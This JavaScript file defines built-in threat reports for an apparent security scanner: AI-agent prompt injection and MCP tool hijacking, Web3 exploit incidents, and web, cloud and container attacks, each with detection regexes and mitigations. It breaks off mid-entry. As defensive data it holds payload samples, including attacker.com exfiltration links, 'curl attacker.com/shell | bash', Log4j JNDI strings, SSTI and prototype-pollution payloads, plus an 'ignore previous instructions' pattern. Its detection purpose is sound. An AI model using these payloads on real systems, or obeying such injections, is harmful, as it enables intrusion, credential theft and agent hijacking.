import fs from 'node:fs';
import path from 'node:path';
export const BUILTIN_THREAT_REPORTS = [
    // ==================== 1. AI AGENT & LLM THREAT INTELLIGENCE ====================
    {
        id: 'REP-CF-AI-001',
        title: 'Cloudflare AI Skill: Indirect Prompt Injection via Untrusted Markdown & Hidden Comments',
        source: 'CLOUDFLARE_RESEARCH',
        date: '2024-09-15',
        severity: 'HIGH',
        category: 'AI_AGENT',
        targetEcosystem: 'AI_AGENT',
        vulnerabilityClass: 'Prompt Injection / Guardrail Evasion',
        attackVariants: [
            'HTML Comment Smuggling (<!-- SYSTEM: override instructions -->)',
            'Zero-Width Character Embedding / Unicode Homoglyph Evasion',
            'Markdown Image Exfiltration wrapper (![leak](https://attacker.com/log?q=${SECRET}))',
            'Fake Tool Delimiter Injection (<tool_call>{"name":"run_command"...}</tool_call>)'
        ],
        triggerPatterns: [
            '<!--.*override.*-->',
            '!\\[.*\\]\\(https?:\\/\\/[^)]*\\$\\{',
            '<tool_call>|<function_call>|\\[TOOL_CALL\\]',
            '(?:ignore|bypass|override)\\s+(?:previous|all)\\s+instructions'
        ],
        summary: 'Untrusted user content fed directly into LLM prompts without delimiter isolation allows attackers to override system prompts or exfiltrate private contexts via crafted image markdown.',
        exploitMechanism: 'Attacker supplies hidden prompt payloads inside user data (e.g. issues, reviews, fetched URLs) causing the agent to execute unauthorized tool calls or leak conversation history.',
        mitigation: 'Implement strict XML tag separation (e.g. <untrusted_context>...</untrusted_context>), sanitize markdown image URLs, and enforce tool execution guardrails with human confirmation.',
        referenceUrl: 'https://blog.cloudflare.com/ai-security-audit-skills'
    },
    {
        id: 'REP-OWASP-LLM02',
        title: 'OWASP LLM02: Insecure MCP Tool Call Execution & Privilege Escalation',
        source: 'OWASP',
        date: '2024-10-01',
        severity: 'CRITICAL',
        category: 'AI_AGENT',
        targetEcosystem: 'AI_AGENT',
        vulnerabilityClass: 'Insecure Output Handling / Command Execution',
        attackVariants: [
            'Unchecked Shell Execution from Model Arguments',
            'Path Traversal via AI Tool File Path Parameter',
            'Blind Webhook Triggering with Sensitive Context',
            'Automated State Mutation without Schema Guardrails'
        ],
        triggerPatterns: [
            '(?:run_command|execute_shell|system_call|execTool)\\s*\\(\\s*(?:llmResponse|args|toolCall)',
            'child_process\\.(?:exec|spawn)\\s*\\(.*toolCall\\.args',
            'fs\\.(?:writeFile|unlink)\\s*\\(.*toolCall\\.args'
        ],
        summary: 'When AI agents invoke Model Context Protocol (MCP) tools or system commands using unvalidated arguments provided by LLMs, malicious prompts can achieve arbitrary remote code execution.',
        exploitMechanism: 'An injected prompt instructs the LLM to call `run_command` with an OS payload like `rm -rf /` or `curl attacker.com/shell | bash`.',
        mitigation: 'Validate tool arguments against strict Zod/JSON schemas. Confine tool processes inside read-only or containerized sandboxes, and forbid raw shell evaluation.',
        referenceUrl: 'https://owasp.org/www-project-top-10-for-large-language-model-applications/'
    },
    {
        id: 'REP-LANGCHAIN-001',
        title: 'CVE-2023-39659: LangChain & LlamaIndex Arbitrary Code Execution in REPL Tools',
        source: 'NVD_CVE',
        date: '2023-08-18',
        severity: 'CRITICAL',
        category: 'AI_AGENT',
        targetEcosystem: 'AI_AGENT',
        vulnerabilityClass: 'Arbitrary Code Execution via AI REPL',
        attackVariants: [
            'PythonAstREPLTool Unsanitized exec() Invocation',
            'PALChain / Model-Generated Code Evaluation',
            'Bypass via __import__("os").system()'
        ],
        triggerPatterns: [
            'PythonAstREPLTool',
            'PALChain\\.from_math_prompt',
            'exec\\s*\\(.*generated_code'
        ],
        summary: 'LangChain experimental REPL tools allowed LLMs to generate arbitrary Python strings that were executed directly on the host machine without containerization or capability limits.',
        exploitMechanism: 'Prompt injection instructed the LLM to return code importing `subprocess` or `socket` to establish reverse shell access.',
        mitigation: 'Isolate code execution into ephemeral Docker sandboxes or gVisor microVMs with network egress restrictions.',
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-39659'
    },
    // ==================== 2. WEB3 & SMART CONTRACT THREAT INTEL ====================
    {
        id: 'REP-IMM-SOL-001',
        title: 'Immunefi $320M Wormhole Bridge Incident: Deprecated Sysvar Signature Introspection Bypass',
        source: 'IMMUNEFI',
        date: '2022-02-02',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_SOLANA',
        vulnerabilityClass: 'Signature Verification Bypass',
        attackVariants: [
            'Unchecked Instruction Sysvar Account Substitution',
            'Deprecated InstructionsSysvar Introspection',
            'Forged Guardian VAA Signatures via Mock Verify Program'
        ],
        triggerPatterns: [
            'load_instruction_at(?:_checked)?',
            'InstructionsSysvar',
            'verify_signatures',
            'AccountInfo.*secp256k1_program'
        ],
        summary: 'The Wormhole bridge failed to verify that the `InstructionsSysvar` account was indeed the genuine system account, allowing attackers to inject a fake sysvar account that claimed signature verification had succeeded.',
        exploitMechanism: 'Attacker substituted the native Solana `sysvar::instructions` account with an attacker-controlled account pre-populated with fake signature success data, minting 120k wETH.',
        mitigation: 'In Anchor, verify `instructions: AccountInfo<sysvar::instructions::Id>` or use `solana_program::sysvar::instructions::check_id(&account.key)`.',
        referenceUrl: 'https://immunefi.com/bounty/wormhole/'
    },
    {
        id: 'REP-IMM-SOL-002',
        title: 'Cashio App $52M Exploit: Unvalidated Collateral Bank & Missing Mint Ownership Check',
        source: 'IMMUNEFI',
        date: '2022-03-23',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_SOLANA',
        vulnerabilityClass: 'Missing Account Constraint / Type Confusion',
        attackVariants: [
            'Unvalidated Bank Account Parameter',
            'Fake Collateral Token Minting',
            'Missing Anchor has_one or constraint checks on bank.collateral_mint'
        ],
        triggerPatterns: [
            'ctx\\.accounts\\.bank(?![^;]*collateral_mint)',
            'AccountInfo.*collateral',
            'mint_to\\s*\\(.*ctx\\.accounts\\.bank'
        ],
        summary: 'Cashio allowed users to deposit collateral into any arbitrary bank account passed in the instruction without verifying that the bank was approved by the master protocol authority.',
        exploitMechanism: 'Attacker created a fake counterfeit bank with worthless tokens and deposited it into Cashio, minting $52 million COW tokens.',
        mitigation: 'Use Anchor constraints `#[account(has_one = collateral_mint, constraint = bank.authority == expected_auth)]` or verify PDAs strictly.',
        referenceUrl: 'https://immunefi.com/bounty/cashio/'
    },
    {
        id: 'REP-C4-CURVE-001',
        title: 'Code4rena / Curve Finance: Read-Only Reentrancy across DeFi Oracle Pricing',
        source: 'CODE4RENA',
        date: '2023-04-10',
        severity: 'HIGH',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Read-Only Reentrancy / Oracle Manipulation',
        attackVariants: [
            'View Function Reentrancy during get_virtual_price()',
            'Flash Loan Balances Imbalance during Liquidity Removal',
            'Collateral Value Inflation in External Lending Protocols'
        ],
        triggerPatterns: [
            'get_virtual_price\\s*\\(',
            'remove_liquidity',
            'calc_withdraw_one_coin',
            'oracle\\.getAssetPrice'
        ],
        summary: 'A protocol reading `get_virtual_price()` from a Curve pool during an uncompleted state transition of `remove_liquidity` reads a distorted price, enabling collateral under-collateralization attacks.',
        exploitMechanism: 'Attacker calls `remove_liquidity` on Curve, triggering raw ETH transfer to their fallback function. Inside fallback, they borrow from an external protocol reading Curve virtual price before the pool settles token balances.',
        mitigation: 'Check reentrancy flags or query oracles that protect against read-only reentrancy (e.g. check `curvePool.claim_admin_fees()` lock or use TWAP).',
        referenceUrl: 'https://code4rena.com/reports/'
    },
    {
        id: 'REP-NOMAD-001',
        title: 'Nomad Bridge $190M Incident: Uninitialized Root 0x00 Treated as Valid Proof',
        source: 'IMMUNEFI',
        date: '2022-08-01',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Default State Authentication Bypass',
        attackVariants: [
            'Uninitialized 0x00 Merkle Root Verification',
            'Copy-Paste Transaction Replay by Crowd',
            'Missing Zero Address or Zero Root Check'
        ],
        triggerPatterns: [
            'messages\\[.*root\\]',
            'confirmAt\\[.*0x0+\\]',
            'acceptableRoot\\s*\\(.*0x0'
        ],
        summary: 'During a routine deployment upgrade, the Replica contract initialized the acceptable root to `bytes32(0)`. Because unproven messages had a root of 0, all arbitrary messages were accepted as pre-verified.',
        exploitMechanism: 'Attackers forged withdrawal transactions with zero proof checks, draining $190 million across multiple chains.',
        mitigation: 'Explicitly check `require(root != bytes32(0))` and enforce invariant checks during contract initialization.',
        referenceUrl: 'https://immunefi.com/bounty/nomad/'
    },
    {
        id: 'REP-EULER-001',
        title: 'Euler Finance $197M Exploit: Insolvent Liquidation via donateToReserves',
        source: 'SHERLOCK',
        date: '2023-03-13',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Donation Attack / Health Factor Invariant Disconnect',
        attackVariants: [
            'donateToReserves Without Health Factor Invariant Check',
            'Flash Loan Leverage Self-Liquidation',
            'eToken / dToken Asymmetric State Disruption'
        ],
        triggerPatterns: [
            'donateToReserves',
            'checkLiquidity\\s*\\(',
            'liquidate\\s*\\('
        ],
        summary: 'Euler allowed users to donate deposited eTokens to reserves without verifying if the user remained solvent afterwards. An attacker used flash loans to deposit, donate eTokens to push their position underwater, and self-liquidate with extreme discounts.',
        exploitMechanism: 'Donating collateral removed the collateral assets while leaving debt intact without triggering solvency checks, allowing the attacker to claim the entire protocol collateral at artificial liquidation bonuses.',
        mitigation: 'Always verify health factor solvency `checkLiquidity(msg.sender)` after balance-decreasing operations like donateToReserves.',
        referenceUrl: 'https://sherlock.xyz/audits'
    },
    {
        id: 'REP-KYBER-001',
        title: 'KyberSwap Elastic $54M Incident: Concentrated Liquidity Tick Rounding Exploitation',
        source: 'CODE4RENA',
        date: '2023-11-22',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Rounding Error / Double-Counted Liquidity',
        attackVariants: [
            'Cross-Tick Math Rounding Direction Discrepancy',
            'Infinite Liquidity Loop via Precision Truncation',
            'Swap Fee & Tick Recomputation Disconnect'
        ],
        triggerPatterns: [
            'computeSwapStep',
            'crossTick',
            'getNextSqrtPriceFromInput'
        ],
        summary: 'Flaws in the reinvestment curve math when swapping across adjacent ticks allowed an attacker to trick the pool into double-counting liquidity, draining pool reserves completely.',
        exploitMechanism: 'A sequence of swaps brought the pool to a precise tick boundary where rounding errors inflated the apparent liquidity by orders of magnitude.',
        mitigation: 'Enforce rigorous formal verification on math formulas and round strictly against the trader.',
        referenceUrl: 'https://blog.kyberswap.com/'
    },
    // ==================== 3. WEB2 & CLOUD SECURITY REPORTS ====================
    {
        id: 'REP-CVE-2024-34351',
        title: 'CVE-2024-34351: Next.js Server Actions SSRF & Host Header Poisoning',
        source: 'NVD_CVE',
        date: '2024-05-15',
        severity: 'HIGH',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Server-Side Request Forgery (SSRF)',
        attackVariants: [
            'Host Header Manipulation in Server Action Redirects',
            'Internal Microservice SSRF via Header Injection',
            'Loopback / 127.0.0.1 Forwarding with Custom Port'
        ],
        triggerPatterns: [
            'redirect\\s*\\(.*(?:req\\.headers|Host)',
            'fetch\\s*\\(.*headers\\[[\'"]host[\'"]\\]',
            'new URL\\s*\\(.*(?:req\\.headers|req\\.headers\\.get\\([\'"]host[\'"]\\))'
        ],
        summary: 'Next.js Server Actions allowed an attacker to spoof the `Host` or `X-Forwarded-Host` header during internal redirect handling, causing the server to send an internal request to attacker-controlled origins.',
        exploitMechanism: 'Sending a POST request to Server Action endpoint with `Host: evil.com` causes Next.js internal redirect logic to issue a backend HTTP GET request to `http://evil.com/`.',
        mitigation: 'Upgrade Next.js to >= 14.1.1. Validate and restrict trusted Host headers, or disable server action redirects to external hosts.',
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-34351'
    },
    {
        id: 'REP-CVE-2021-44228',
        title: 'CVE-2021-44228: Log4j Remote Code Execution & JNDI Nested Evasion Variants',
        source: 'NVD_CVE',
        date: '2021-12-10',
        severity: 'CRITICAL',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'JNDI / Expression Language Injection',
        attackVariants: [
            'Nested Lowercase Obfuscation: ${${lower:j}ndi:ldap://...}',
            'Environment Variable Exfiltration: ${jndi:dns://${env:AWS_SECRET_KEY}.attacker.com}',
            'Double Escaped Variable Lookup: ${::-j}${::-n}${::-d}${::-i}:ldap',
            'Protocol Variations: ldaps://, rmi://, dns://, iiop://'
        ],
        triggerPatterns: [
            '\\$\\{jndi:',
            '\\$\\{\\$\\{.*ndi:',
            'logger\\.(?:info|error|debug|warn)\\s*\\(.*req\\.'
        ],
        summary: 'Log4j message lookup feature evaluated `${jndi:...}` strings inside log messages, allowing attackers to force the server to download and execute arbitrary Java classes from remote LDAP/RMI servers.',
        exploitMechanism: 'Attacker inserts `${jndi:ldap://attacker.com/exploit}` into User-Agent or input headers, triggering background RCE.',
        mitigation: 'Disable JNDI lookups (log4j2.formatMsgNoLookups=true) and upgrade to patched Log4j >= 2.17.1.',
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
    },
    {
        id: 'REP-GHSA-PROTO-01',
        title: 'GHSA / Prototype Pollution: Object Prototype Modification to Remote Code Execution',
        source: 'GITHUB_ADVISORY',
        date: '2023-11-20',
        severity: 'HIGH',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Prototype Pollution',
        attackVariants: [
            'Recursive Deep Merge without __proto__ check',
            'JSON.parse payload: {"__proto__": {"isAdmin": true}}',
            'Constructor.prototype pollution in query string parsers',
            'RCE gadget chaining via child_process options.shell / env'
        ],
        triggerPatterns: [
            '\\[[\'"]__proto__[\'"]\\]',
            'Object\\.assign\\s*\\([^,]+,\\s*req\\.body\\)',
            'lodash\\.merge|deepMerge|mergeObjects'
        ],
        summary: 'Unsafe recursive merging of untrusted JSON objects into JavaScript objects allows overwriting `Object.prototype`, tampering with application logic or achieving RCE through child_process option gadgets.',
        exploitMechanism: 'Submitting a JSON object with `{"__proto__": {"shell": "/bin/sh -c evil"}}` modifies default options passed to exec/fork calls across the entire Node process.',
        mitigation: 'Freeze Object.prototype (`Object.freeze(Object.prototype)`), use Map instead of plain objects, or reject keys named `__proto__`, `constructor`, `prototype`.',
        referenceUrl: 'https://github.com/advisories'
    },
    {
        id: 'REP-CLOUDFLARE-METADATA',
        title: 'Cloudflare Threat Brief: Cloud Instance Metadata Service (IMDSv1) Exploitation via SSRF',
        source: 'CLOUDFLARE_RESEARCH',
        date: '2024-03-12',
        severity: 'CRITICAL',
        category: 'CLOUD',
        targetEcosystem: 'CLOUD',
        vulnerabilityClass: 'Cloud Credential Theft via SSRF',
        attackVariants: [
            'IPv4 Decimal / Octal Bypass: http://2852039166 or http://0251.0372.0372.0372',
            'IPv6 Mapped IPv4: http://[::ffff:169.254.169.254]',
            'DNS Rebinding to 169.254.169.254 via nip.io or custom DNS records',
            'Redirect Chaining: 302 redirect from external host to local metadata endpoint'
        ],
        triggerPatterns: [
            '169\\.254\\.169\\.254',
            'metadata\\.google\\.internal',
            'latest\\/meta-data'
        ],
        summary: 'SSRF vulnerabilities in cloud applications often pivot directly to the Cloud Metadata Service (169.254.169.254) to steal temporary IAM role credentials and access keys.',
        exploitMechanism: 'Attacker provides an SSRF payload pointing to `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`, receiving AWS keys with high cluster privileges.',
        mitigation: 'Enforce AWS IMDSv2 (requiring PUT token headers), block outbound HTTP access to 169.254.169.254 via firewall/iptables, and sanitize resolved IP addresses before requesting.',
        referenceUrl: 'https://blog.cloudflare.com/'
    },
    {
        id: 'REP-CF-FLAN-001',
        title: 'Cloudflare Flan Scan: Exposed Management Ports & Unauthenticated Internal Microservices',
        source: 'CLOUDFLARE_RESEARCH',
        date: '2024-08-20',
        severity: 'HIGH',
        category: 'CLOUD',
        targetEcosystem: 'CLOUD',
        vulnerabilityClass: 'Network Service Misconfiguration / Port Exposure',
        attackVariants: [
            'Unauthenticated Redis/Mongo Bind to 0.0.0.0',
            'Vulnerable OpenSSH / Old TLS Ciphers Exposed to WAN',
            'Unprotected Node.js V8 Debugger (Port 9229) RCE'
        ],
        triggerPatterns: [
            '(?:bind|listen|host)\\s*[:=]\\s*[\'"]0\\.0\\.0\\.0[\'"].*(?:6379|9229|27017|2375|5432|3306)',
            '(?:redis|mongo|docker|debug).*0\\.0\\.0\\.0'
        ],
        summary: 'Cloudflare Flan Scan methodology: lightweight network vulnerability scanning identifies open network attack surfaces and exposed management ports before external threat actors exploit them.',
        exploitMechanism: 'Scanning perimeter IP ranges discovers unauthenticated microservices or debug ports bound to 0.0.0.0, allowing attackers to read memory, execute commands, or drop keys.',
        mitigation: 'Bind services to 127.0.0.1 or VPC private endpoints only. Enforce Cloudflare Tunnels (cloudflared) or Zero Trust Access instead of public ports.',
        referenceUrl: 'https://github.com/cloudflare/flan'
    },
    {
        id: 'REP-CF-WORKERS-001',
        title: 'Cloudflare Workers & Edge Security: Unsanitized Subrequest SSRF & Env Credential Leakage',
        source: 'CLOUDFLARE_RESEARCH',
        date: '2024-07-11',
        severity: 'HIGH',
        category: 'CLOUD',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Edge Runtime SSRF & Env Exposure',
        attackVariants: [
            'Edge fetch() Subrequest SSRF to Internal Worker Services',
            'Full env Object Serialization into Response Header/Body',
            'Unchecked cf-connecting-ip Header Spoofing'
        ],
        triggerPatterns: [
            'fetch\\s*\\(\\s*request\\.url',
            'JSON\\.stringify\\s*\\(\\s*env\\b',
            'cf-connecting-ip'
        ],
        summary: 'Cloudflare Workers serverless edge execution handles millions of subrequests. Without strict URL validation, subrequests can be tricked into fetching internal service bindings or leaking secret credentials stored in env.',
        exploitMechanism: 'Malicious client passes a targeted origin in the query parameter, causing the edge worker to proxy sensitive internal resources or reflect environment variables.',
        mitigation: 'Implement URL allowlists for edge subrequests and never dump the `env` object directly into client responses.',
        referenceUrl: 'https://developers.cloudflare.com/workers/runtime-apis/fetch/'
    },
    // ==================== 4. AUTONOMOUS SECURITY THREAT INTELLIGENCE MATRIX ====================
    // Threat Vector: DeFi Lending & Vault Share Manipulation
    {
        id: 'REP-VAULT-INFL-001',
        title: 'ERC-4626 Vault Share Inflation & Frontrunning Donation Attack',
        source: 'COMMUNITY',
        date: '2023-05-12',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Share Inflation / Rounding Exploitation',
        attackVariants: [
            'First Depositor 1 Wei Share Inflation via Direct Asset Donation',
            'Division Truncation Round-Down to Zero Shares for Subsequent Depositors',
            'Frontrun Vault Creation via MEV Bundles'
        ],
        triggerPatterns: [
            'totalAssets\\(\\)\\s*\\/\\s*totalSupply\\(\\)',
            'convertToShares',
            'previewDeposit',
            'ERC4626'
        ],
        summary: 'In empty or newly initialized ERC-4626 vaults, the first depositor deposits 1 wei to get 1 share, then directly transfers a massive amount of assets to the vault contract. Subsequent victim depositors receive 0 shares due to rounding down, forfeiting their capital.',
        exploitMechanism: 'Attacker monitors mempool for vault deployments, deposits 1 wei to mint 1 share, then directly transfers 1,000,000 tokens to the vault. When a victim deposits 1,999,999 tokens, calculation computes shares = 1,999,999 * 1 / (1,000,001) = 1 share, or 0 shares if victim deposits less than the donated amount.',
        mitigation: 'Implement OpenZeppelin ERC4626 virtual shares/assets offset (`_decimalsOffset() = 3`) or burn an initial dead share allocation (e.g. 1000 shares to 0xdead).',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/682.html'
    },
    {
        id: 'REP-ORACLE-SOL-001',
        title: 'Solana Oracle Manipulation: Mango Markets $114M Perpetuals Oracle Price Exploit',
        source: 'COMMUNITY',
        date: '2022-10-11',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_SOLANA',
        vulnerabilityClass: 'Oracle Manipulation / Illiquid Asset Collateral Inflation',
        attackVariants: [
            'Self-Trading MNGO Perpetuals to Distort Spot / Pyth Oracle Feeds',
            'Inflating Unrealized PnL to Borrow Protocol USDC/SOL Reserves',
            'Cascading Protocol Bad Debt Draining All Vault Liquidity'
        ],
        triggerPatterns: [
            'oracle\\.load_price',
            'pyth_client::Price',
            'perp_market\\.bids',
            'get_unrealized_pnl'
        ],
        summary: 'Attacker funded two accounts on Mango Markets, opened opposite large long and short positions on the illiquid MNGO-PERP contract, and bought up MNGO spot prices on DEXes. The sudden price surge inflated the attacker account unrealized PnL, allowing borrowing of all depositors funds.',
        exploitMechanism: 'Illiquid token price inflated 5-10x within minutes. The protocol evaluated account borrowing capacity based on unverified instantaneous oracle marks with insufficient liquidity haircuts.',
        mitigation: 'Impose strict position and borrow limits on illiquid collateral, cap oracle deviation tolerance, and apply exponential collateral haircuts.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/682.html'
    },
    // Threat Vector: Advanced Injection & Gadget Chains
    {
        id: 'REP-INJ-SSTI-001',
        title: 'Server-Side Template Injection (SSTI) to Remote Code Execution',
        source: 'COMMUNITY',
        date: '2024-01-20',
        severity: 'CRITICAL',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Server-Side Template Injection (SSTI)',
        attackVariants: [
            'Jinja2 / Python MRO Subclass Traversal: {{ "".__class__.__mro__[1].__subclasses__() }}',
            'Twig / PHP Filter Code Execution: {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
            'Node.js EJS / Nunjucks Environment Variable Leak & Child Process Execution'
        ],
        triggerPatterns: [
            'render_template_string',
            'Handlebars\\.compile\\s*\\(',
            'nunjucks\\.renderString',
            'ejs\\.render\\s*\\('
        ],
        summary: 'When web applications concatenate user input directly into template strings instead of passing data through context dictionaries, template engines evaluate template directives as code, resulting in complete host compromise.',
        exploitMechanism: 'Attacker injects template delimiter characters (`{{`, `<%`) with language-specific reflection payloads to traverse class hierarchies and invoke `os.popen()` or `child_process.exec()`.',
        mitigation: 'Separate template source code from dynamic data. Always use pre-compiled static templates with parameterized variables.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/1336.html'
    },
    {
        id: 'REP-INJ-PROTO-001',
        title: 'Prototype Pollution to Server-Side RCE Gadget Chains',
        source: 'COMMUNITY',
        date: '2024-03-15',
        severity: 'HIGH',
        category: 'INJECTION',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Prototype Pollution / Object Prototype Poisoning',
        attackVariants: [
            'JSON Body Recursive Merge Overwrite (__proto__.env)',
            'child_process.spawn Option Poisoning (shell / NODE_OPTIONS)',
            'EJS outputFunctionName Pollution triggering RCE'
        ],
        triggerPatterns: [
            '__proto__',
            'constructor\\.prototype',
            'lodash\\.merge\\s*\\(',
            'deepMerge\\s*\\('
        ],
        summary: 'Recursive object cloning or merge utilities that do not sanitize `__proto__` or `constructor` keys allow attackers to inject arbitrary properties onto global `Object.prototype`.',
        exploitMechanism: 'Polluting properties like `NODE_OPTIONS` or child process options causes downstream modules that spawn child processes to execute arbitrary attacker-controlled binaries.',
        mitigation: 'Use `Object.create(null)` for key-value maps, freeze prototypes using `Object.freeze(Object.prototype)`, or strip proto keys before merging.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/1336.html'
    },
    // Threat Vector: Cloud & Container Security Posture
    {
        id: 'REP-CONT-ESCAPE-001',
        title: 'Container Breakout via Docker Socket & Host Namespace Sharing',
        source: 'COMMUNITY',
        date: '2024-06-10',
        severity: 'CRITICAL',
        category: 'CLOUD',
        targetEcosystem: 'CLOUD',
        vulnerabilityClass: 'Container Escape / Privilege Escalation',
        attackVariants: [
            'Host Root Mount via Exposed /var/run/docker.sock',
            'Host Process Injection via hostPID: true and /proc/<pid>/root',
            'CAP_SYS_ADMIN Abuse with cgroup notify_on_release Payload'
        ],
        triggerPatterns: [
            'docker\\.sock',
            'hostPID\\s*:\\s*true',
            'privileged\\s*:\\s*true',
            'cap_add.*SYS_ADMIN'
        ],
        summary: 'Containerized workloads running with access to the host Docker daemon socket or excessive Linux capabilities allow containerized processes to spawn root containers mounting the host filesystem.',
        exploitMechanism: 'Process inside container uses curl or docker CLI to talk to `/var/run/docker.sock`, starting a new container with `-v /:/host` to write SSH keys to `/host/root/.ssh/authorized_keys`.',
        mitigation: 'Never expose Docker daemon socket to containers. Use rootless containers, drop all default capabilities, and enforce readonly root filesystems.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/250.html'
    },
    // Threat Vector: Attack Surface & Sensitive Exposure
    {
        id: 'REP-EXP-ACTUATOR-001',
        title: 'Spring Boot Actuator Unauthenticated Heapdump & Env Exfiltration',
        source: 'COMMUNITY',
        date: '2024-04-18',
        severity: 'HIGH',
        category: 'MISCONFIG',
        targetEcosystem: 'WEB2',
        vulnerabilityClass: 'Sensitive Endpoint Exposure / Memory Dump',
        attackVariants: [
            'Direct HTTP GET /actuator/heapdump memory extraction',
            '/actuator/env Spring Cloud Config secret dumping',
            '/actuator/gateway/routes dynamic route injection'
        ],
        triggerPatterns: [
            'management\\.endpoints\\.web\\.exposure\\.include\\s*=\\s*\\*',
            '\/actuator\/(?:heapdump|env|refresh)',
            'endpoints\.actuator'
        ],
        summary: 'Exposing Spring Boot Actuator management endpoints without authentication allows unauthenticated internet actors to download entire JVM heap dumps or decrypted environment variables containing database and cloud credentials.',
        exploitMechanism: 'Attacker sends a single GET request to `/actuator/heapdump`, parses memory strings using tools like jhat or strings, and extracts JWT signing keys and database passwords.',
        mitigation: 'Set `management.endpoints.web.exposure.include=health,info` and enforce Spring Security authentication on all management paths.',
        referenceUrl: 'https://cwe.mitre.org/data/definitions/200.html'
    },
    // Threat Vector: Smart Contract Callback & Reentrancy
    {
        id: 'REP-EVM-HOOK-001',
        title: 'Uniswap V1 & Lendf.me $25M ERC-777 Hook Reentrancy Incident',
        source: 'TRAIL_OF_BITS',
        date: '2020-04-19',
        severity: 'CRITICAL',
        category: 'WEB3',
        targetEcosystem: 'WEB3_EVM',
        vulnerabilityClass: 'Token Standard Hook Reentrancy (ERC-777)',
        attackVariants: [
            'tokensReceived Hook Reentrancy on imBTC / ERC-777',
            'Double-Spend Deposit Crediting before Balance Adjustment',
            'Bypassing Checks-Effects-Interactions when invoking external token contract'
        ],
        triggerPatterns: [
            'tokensReceived',
            'tokensToSend',
            'IERC777Recipient',
            'ERC777'
        ],
        summary: 'Lendf.me and Uniswap V1 suffered devastating exploits when interacting with ERC-777 tokens like imBTC. Unlike standard ERC-20, ERC-777 calls `tokensToSend` and `tokensReceived` hooks on the sender and recipient during transfers, triggering arbitrary reentrancy.',
        exploitMechanism: 'During a deposit or withdraw call, the contract transferred tokens to the attacker before decrementing the attacker debt, invoking the attacker `tokensReceived` hook which called `withdraw` again.',
        mitigation: 'Use OpenZeppelin `ReentrancyGuard` on all state-changing functions and adhere strictly to Checks-Effects-Interactions even for ERC-20/777 token operations.',
        referenceUrl: 'https://swcregistry.io/docs/SWC-107/'
    },
    // ==================== 5. NEXT-GEN ATTACK VARIANTS (100+ UPGRADE) ====================
    // AI Agent & MCP Security
    {
        id: 'REP-AI-MCP-003',
        title: 'Model Context Protocol (MCP) Shadow Tool Injection & Parameter Smuggling',
        source: 'HEXORA_RESEARCH',
        date: '2026-10-15',
        severity: 'CRITICAL',
        category: 'AI_AGENT',
        targetEcosystem: 'AI_AGENT',
        vulnerabilityClass: 'MCP Tool Injection / Agent Control Hijacking',
        attackVariants: [
            'MCP Stdio Tool Argument Prototype Pollution',
            'Dynamic Schema Poisoning via Stdio Capability Advertisement',
            'Shadow Tool Parameter Smuggling through JSON-RPC Delimiters',
            'Subagent Impersonation via Crafted MCP Session Tokens',
            'Agent Sandboxing Evasion via Unrestricted Spawn in MCP Server',
            'Exfiltration of Environment Secrets through Tool Notification Payloads'
        ],
        triggerPatterns: [
            'tools\/call',
            'ServerCapabilities',
            'StdioServerTransport',
            'mcpServer\\.tool\\s*\\(',
            'spawn\\s*\\(.*toolArgs'
        ],
        summary: 'Malicious prompts inject forged JSON-RPC payloads into MCP stdio communication channels, tricking LLM host orchestrators into executing unprivileged host commands or leaking environment variables.',
        exploitMechanism: 'Attacker leverages loose schema validation in custom MCP tool declarations to inject nested bash command parameters or override system capabilities.',
        mitigation: 'Enforce strict Zod schemas on all tool inputs, mandate capability whitelisting, and run MCP tool processes in gVisor sandboxes.',
        referenceUrl: 'https://modelcontextprotocol.io/specification'
    },
    {
        id: 'REP-AI-AGENT-004',
        title: 'Multi-Agent Workspace Scratchpad Hijacking & Memory Poisoning',
        source: 'HEXORA_RESEARCH',
        date: '2026-10-20',
        severity: 'HIGH',
        category: 'AI_AGENT',
        targetEcosystem: 'AI_AGENT',
        vulnerabilityClass: 'Agent Memory Contamination / Goal Hijack',
        attackVariants: [
            'Memory Injection via Shared Scratchpad Files',
            'Agent Goal Hijacking through Injected System Comments',
            'Peer-to-Peer Agent Protocol Token Smuggling',
            'Recursive Subagent Fork Bomb via Infinite Task Delegation',
            'Cross-Agent Context Bleed through Unpartitioned Memory Banks',
            'Synthetic Memory Hallucination Injection via Vector Store Writes'
        ],
        triggerPatterns: [
            'invoke_subagent\\s*\\(',
            'scratchpad\\.write',
            'agent_memory\\.append',
            'send_message\\s*\\(.*subagent'
        ],
        summary: 'When multi-agent systems share files, scratchpads, or memory logs without cryptographic isolation, compromised worker agents can poison parent supervisor goals.',
        exploitMechanism: 'A subagent instructed with untrusted code writes special formatting tokens into shared scratchpads, causing the supervisor agent to bypass safety checks.',
        mitigation: 'Implement immutable audit trails, sanitize inter-agent messages, and enforce strict execution budgets on recursive subagent delegation.',
